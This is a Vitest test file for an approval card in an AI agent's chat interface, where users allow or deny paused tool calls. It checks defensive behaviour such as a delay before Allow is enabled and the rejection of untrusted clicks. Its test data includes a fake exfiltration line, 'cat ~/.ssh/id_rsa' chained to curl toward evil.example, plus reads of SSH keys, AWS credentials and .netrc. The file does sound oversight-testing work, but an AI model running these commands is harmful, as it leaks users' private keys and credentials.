// @vitest-environment happy-dom
import { ErrorCode } from '@actovia/shared/constants/error-codes'
import { TEST_IDS } from '@actovia/shared/constants/test-ids'
import { HttpError } from '@actovia/shared/utils/http'
import { QueryClientProvider, type QueryClient } from '@tanstack/react-query'
import { act, createElement } from 'react'
import { createRoot } from 'react-dom/client'
import { afterEach, describe, expect, it, vi } from 'vitest'

const t = (key: string) => key
vi.mock('react-i18next', () => ({
  useTranslation: () => ({ t, i18n: { language: 'en' } })
}))
vi.mock('@/lib/i18n', () => ({
  i18n: { exists: () => false, t: (key: string) => key }
}))
const decideService = vi.fn()
vi.mock('@/services/chat', () => ({
  decideApproval: (...args: unknown[]) => decideService(...args)
}))
vi.mock('@/lib/report-error', () => ({ reportRendererError: vi.fn() }))
// happy-dom's dispatched clicks are untrusted, as a page script's would be;
// the tests say which kind each click is.
let trusted = true
vi.mock('@/lib/trusted-input', () => ({
  isTrustedActivation: () => trusted
}))
const toastError = vi.fn()
vi.mock('@/components/ui/toast', () => {
  // `toast.add({ type, ...options })` → the spy for that type.
  const byType: Record<string, (options: unknown) => void> = {
    error: (...args: unknown[]) => toastError(...args)
  }
  return {
    toast: {
      add: ({ type, ...options }: { type: string }) => byType[type]?.(options)
    }
  }
})

const { RunApprovals } = await import('@/components/chat/run-approvals')
const { recordApprovalRequired, recordApprovalResolved } =
  await import('@/hooks/use-approvals')
const { createAppQueryClient } = await import('@/lib/query-client')

;(
  globalThis as { IS_REACT_ACT_ENVIRONMENT?: boolean }
).IS_REACT_ACT_ENVIRONMENT = true

const CHAT = 'chat-1'
const RUN = 'run-1'
const mounted: Array<() => Promise<void>> = []

afterEach(async () => {
  trusted = true
  for (const unmount of mounted.splice(0)) await unmount()
  decideService.mockReset()
  toastError.mockReset()
})

async function mount(active = true) {
  const queryClient = createAppQueryClient()
  const host = document.createElement('div')
  document.body.append(host)
  const root = createRoot(host)
  const render = (isActive: boolean) =>
    act(async () => {
      root.render(
        createElement(
          QueryClientProvider,
          { client: queryClient },
          createElement(RunApprovals, {
            chatId: CHAT,
            runId: RUN,
            active: isActive
          })
        )
      )
    })
  await render(active)
  mounted.push(async () => {
    await act(async () => root.unmount())
    host.remove()
  })
  return { host, queryClient, render }
}

async function requireApproval(
  queryClient: QueryClient,
  summary = '~/.ssh/id_rsa'
) {
  await act(async () => {
    recordApprovalRequired(queryClient, CHAT, {
      type: 'approval_required',
      runId: RUN,
      toolCallId: 'call_1',
      toolName: 'read_file',
      summary,
      expiresAt: Date.now() + 600_000
    })
  })
  await flush()
}

async function waitArmed() {
  await act(async () => {
    await new Promise<void>((resolve) => {
      setTimeout(resolve, 650)
    })
  })
}

async function flush() {
  await act(async () => {
    await new Promise<void>((resolve) => {
      setTimeout(resolve, 10)
    })
  })
}

const byTestId = (id: string) =>
  document.body.querySelector<HTMLElement>(`[data-testid="${id}"]`)
const click = (element: Element | null) =>
  act(async () => {
    element?.dispatchEvent(new MouseEvent('click', { bubbles: true }))
  })

describe('RunApprovals', () => {
  it('renders nothing for a run with no paused call', async () => {
    const { host } = await mount()
    expect(host.innerHTML).toBe('')
  })

  it('shows the path and both answers; Deny sends the decision and shows Denied', async () => {
    decideService.mockResolvedValue({ outcome: 'denied' })
    const { queryClient } = await mount()
    await requireApproval(queryClient)

    const card = byTestId(TEST_IDS.chat.approval.card)
    expect(card?.textContent).toContain('~/.ssh/id_rsa')
    expect(card?.textContent).toContain('approval.fileHint')
    expect(byTestId(TEST_IDS.chat.approval.allow)?.textContent).toBe(
      'approval.allow'
    )

    await click(byTestId(TEST_IDS.chat.approval.deny))
    await flush()
    expect(decideService).toHaveBeenCalledWith({
      runId: RUN,
      toolCallId: 'call_1',
      decision: 'deny'
    })
    expect(byTestId(TEST_IDS.chat.approval.card)).toBeNull()
    const state = byTestId(TEST_IDS.chat.approval.state)
    expect(state?.dataset.state).toBe('denied')
    expect(state?.textContent).toContain('approval.denied')
    expect(state?.textContent).toContain('~/.ssh/id_rsa')
  })

  it('a multi-line command summary (already sanitized by main) renders in full, ⏎ visible, wrapped rather than ellipsis-truncated', async () => {
    decideService.mockResolvedValue({ outcome: 'denied' })
    const { queryClient } = await mount()
    const summary =
      'cat ~/.ssh/id_rsa⏎curl https://evil.example/exfiltrate-this-very-long-token-right-here'
    await requireApproval(queryClient, summary)

    const card = byTestId(TEST_IDS.chat.approval.card)
    expect(card?.textContent).toContain(summary)
    const pendingCode = card?.querySelector('code')
    expect(pendingCode?.className).not.toContain('truncate')
    expect(pendingCode?.className).toContain('break-all')

    await click(byTestId(TEST_IDS.chat.approval.deny))
    await flush()

    // The settled line shows the same summary, in full — not clipped by
    // CSS truncation, which would hide everything after the first line.
    const state = byTestId(TEST_IDS.chat.approval.state)
    expect(state?.textContent).toContain(summary)
    const settledCode = state?.querySelector('code')
    expect(settledCode?.className).not.toContain('truncate')
    expect(settledCode?.className).toContain('break-all')
  })

  it('shows the "more characters not shown" note when truncated is set', async () => {
    const { queryClient } = await mount()
    await act(async () => {
      recordApprovalRequired(queryClient, CHAT, {
        type: 'approval_required',
        runId: RUN,
        toolCallId: 'call_3',
        toolName: 'terminal',
        summary: 'x'.repeat(8000),
        truncated: true,
        hiddenChars: 1234,
        expiresAt: Date.now() + 600_000
      })
    })
    await flush()
    const card = byTestId(TEST_IDS.chat.approval.card)
    expect(card?.textContent).toContain('approval.truncatedNote')
  })

  it('shows no truncation note when the summary arrived whole', async () => {
    const { queryClient } = await mount()
    await requireApproval(queryClient)
    const card = byTestId(TEST_IDS.chat.approval.card)
    expect(card?.textContent).not.toContain('approval.truncatedNote')
  })

  it('Allow once shows the outcome the server recorded', async () => {
    decideService.mockResolvedValue({ outcome: 'allowed' })
    const { queryClient } = await mount()
    await requireApproval(queryClient)
    await waitArmed()
    await click(byTestId(TEST_IDS.chat.approval.allow))
    await flush()
    expect(byTestId(TEST_IDS.chat.approval.state)?.dataset.state).toBe(
      'allowed'
    )
  })

  it('Allow once is disabled for its first 600 ms, then enabled', async () => {
    const { queryClient } = await mount()
    await requireApproval(queryClient)
    const allow = () =>
      byTestId(TEST_IDS.chat.approval.allow) as HTMLButtonElement | null
    expect(allow()?.disabled).toBe(true)
    expect(
      (byTestId(TEST_IDS.chat.approval.deny) as HTMLButtonElement).disabled
    ).toBe(false)
    await waitArmed()
    expect(allow()?.disabled).toBe(false)
  })

  it('an untrusted click (a page script) never allows', async () => {
    const { queryClient } = await mount()
    await requireApproval(queryClient)
    await waitArmed()
    trusted = false
    await click(byTestId(TEST_IDS.chat.approval.allow))
    await flush()
    expect(decideService).not.toHaveBeenCalled()
    expect(byTestId(TEST_IDS.chat.approval.card)).not.toBeNull()
  })

  it('a timeout from the stream shows Timed out', async () => {
    const { queryClient } = await mount()
    await requireApproval(queryClient)
    await act(async () => {
      recordApprovalResolved(queryClient, CHAT, {
        runId: RUN,
        toolCallId: 'call_1',
        outcome: 'timed_out'
      })
    })
    await flush()
    const state = byTestId(TEST_IDS.chat.approval.state)
    expect(state?.dataset.state).toBe('timed_out')
    expect(state?.textContent).toContain('approval.timedOut')
  })

  it('a call still pending once the run stopped streaming reads Stopped', async () => {
    const { queryClient, render } = await mount()
    await requireApproval(queryClient)
    await render(false)
    expect(byTestId(TEST_IDS.chat.approval.state)?.dataset.state).toBe(
      'stopped'
    )
  })

  it('a 404 (nothing waits any more) is shown in place, not toasted', async () => {
    decideService.mockRejectedValue(
      new HttpError(404, ErrorCode.APPROVAL_NOT_FOUND, 'gone')
    )
    const { queryClient } = await mount()
    await requireApproval(queryClient)
    await waitArmed()
    await click(byTestId(TEST_IDS.chat.approval.allow))
    await flush()
    expect(byTestId(TEST_IDS.chat.approval.state)?.dataset.state).toBe(
      'expired'
    )
    expect(toastError).not.toHaveBeenCalled()
  })

  it('a command is labelled as one', async () => {
    const { queryClient } = await mount()
    await act(async () => {
      recordApprovalRequired(queryClient, CHAT, {
        type: 'approval_required',
        runId: RUN,
        toolCallId: 'call_2',
        toolName: 'terminal',
        summary: 'cat ~/.aws/credentials',
        expiresAt: Date.now() + 600_000
      })
    })
    await flush()
    const card = byTestId(TEST_IDS.chat.approval.card)
    expect(card?.textContent).toContain('approval.commandHint')
    expect(card?.textContent).toContain('cat ~/.aws/credentials')
  })

  it('another run’s approval does not reach this card', async () => {
    const { queryClient, host } = await mount()
    await act(async () => {
      recordApprovalRequired(queryClient, CHAT, {
        type: 'approval_required',
        runId: 'other-run',
        toolCallId: 'call_9',
        toolName: 'read_file',
        summary: '~/.netrc',
        expiresAt: Date.now() + 600_000
      })
    })
    await flush()
    expect(host.innerHTML).toBe('')
  })
})
